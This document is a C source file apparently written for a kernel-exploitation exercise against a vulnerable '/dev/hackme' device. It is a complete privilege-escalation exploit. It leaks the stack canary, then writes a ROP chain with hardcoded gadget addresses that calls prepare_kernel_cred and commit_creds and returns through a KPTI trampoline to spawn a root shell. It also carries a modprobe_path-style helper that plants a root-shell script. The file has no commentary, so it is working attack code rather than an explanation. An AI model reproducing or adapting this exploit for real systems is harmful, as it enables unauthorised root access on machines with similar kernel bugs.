#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/utsname.h>

typedef void* (*fp_commit_creds)(void *);
typedef void* (*fp_prepare_kernel_cred)(void *);

// commands
#define DEV_PATH "/dev/hackme"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(char* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", (void*)tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

unsigned long get_kernel_sym(char *name) {
        FILE *f;
        unsigned long addr;
        char dummy;
        char sname[512];
        struct utsname ver;
        int ret;
        int rep = 0;
        int oldstyle = 0;

        f = fopen("/proc/kallsyms", "r");
        if (f == NULL) {
                f = fopen("/proc/ksyms", "r");
                if (f == NULL)
                        goto fallback;
                oldstyle = 1;
        }

repeat:
        ret = 0;
        while(ret != EOF) {
                if (!oldstyle)
                        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
                else {
                        ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
                        if (ret == 2) {
                                char *p;
                                if (strstr(sname, "_O/") || strstr(sname, "_S."))
                                        continue;
                                p = strrchr(sname, '_');
                                if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
                                        p = p - 4;
                                        while (p > (char *)sname && *(p - 1) == '_')
                                                p--;
                                        *p = '\0';
                                }
                        }
                }
                if (ret == 0) {
                        fscanf(f, "%s\n", sname);
                        continue;
                }
                if (!strcmp(name, sname)) {
                        fprintf(stdout, "[+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
                        fclose(f);
                        return addr;
                }
        }

        fclose(f);
        if (rep)
                return 0;
fallback:
        uname(&ver);
        if (strncmp(ver.release, "2.6", 3))
                oldstyle = 1;
        sprintf(sname, "/boot/System.map-%s", ver.release);
        f = fopen(sname, "r");
        if (f == NULL)
                return 0;
        rep = 1;
        goto repeat;
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
           /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("/home/user/roooot");
}

void get_shell(void)
{
    system("/bin/sh");
}
uint64_t user_rip = (uint64_t)get_shell;

unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
uint64_t mov_esp_pop2_ret = 0xffffffff8196f56a;
// pop rdi ; ret
uint64_t pop_rdi_ret = 0xffffffff81006370;
// pop rdx ; ret
uint64_t pop_rdx_ret = 0xffffffff81007616;
// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
uint64_t cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4;
// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
uint64_t mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3;
uint64_t commit_creds = 0xffffffff814c6410;
uint64_t prepare_kernel_cred = 0xffffffff814c67f0;
 // swapgs ; pop rbp ; ret
uint64_t swapgs_pop1_ret = 0xffffffff8100a55f;
uint64_t iretq = 0xffffffff8100c0d9;
// swapgs_restore_regs_and_return_to_usermode
uint64_t kpti_tramp = 0xffffffff81200f10;

void build_rop(uint64_t *buf, size_t o)
{
    buf[o++] = 0x0;
    buf[o++] = 0x0;
    buf[o++] = 0x0;
    buf[o++] = pop_rdi_ret;
    buf[o++] = 0x0;
    buf[o++] = prepare_kernel_cred;
    buf[o++] = pop_rdx_ret;
    buf[o++] = 0x8;
    buf[o++] = cmp_rdx_jne_pop2_ret;
    buf[o++] = 0x0;
    buf[o++] = 0x0;
    buf[o++] = mov_rdi_rax_jne_pop2_ret;
    buf[o++] = 0x0;
    buf[o++] = 0x0;
    buf[o++] = commit_creds;
    buf[o++] = kpti_tramp + 22;
    buf[o++] = 0x0;
    buf[o++] = 0x0;
    buf[o++] = user_rip;
    buf[o++] = user_cs;
    buf[o++] = user_rflags;
    buf[o++] = user_sp;
    buf[o++] = user_ss;
}

int main(void)
{
    int fd = open(DEV_PATH, O_RDWR);

    if (fd < 0) {
        perror("open");
    }

    uint64_t buf[50];
    if (read(fd, buf, sizeof(buf)) < 0) {
        perror("read");
    }

    printf("canary: %lx \n", buf[16]);

    for (int i = 0; i < 50; i++) {
        printf("%d : %p \n", i, buf[i]);
    }


    build_rop(buf, 17);

    if (write(fd, buf, sizeof(buf)) < 0) {
        perror("write");
    }
}

